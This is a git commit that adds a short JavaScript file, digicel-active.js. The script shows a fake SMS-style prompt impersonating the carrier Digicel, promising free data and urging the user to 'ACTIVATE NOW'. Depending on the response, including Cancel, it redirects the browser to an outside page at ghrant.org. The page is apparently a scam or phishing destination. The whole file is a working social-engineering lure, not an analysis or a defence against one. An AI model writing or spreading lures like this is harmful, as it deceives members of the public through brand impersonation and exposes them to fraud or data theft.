531a31b43e4472c795325d20ad53fd6cae58446c
mfednewblog8 <nsikakimoh68@gmail.com>
2025-12-13 07:12:37 +0100

    Create digicel-active.js

---
+++ digicel-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE NOW'
+password=prompt('SMS: Congratulations, your Digicel number is eligible to receive free data, click OK to activate now','ACTIVATE NOW');
+if (password != 'ACTIVATE NOW') {
+location.href='https://ghrant.org/digicel.html';
+}
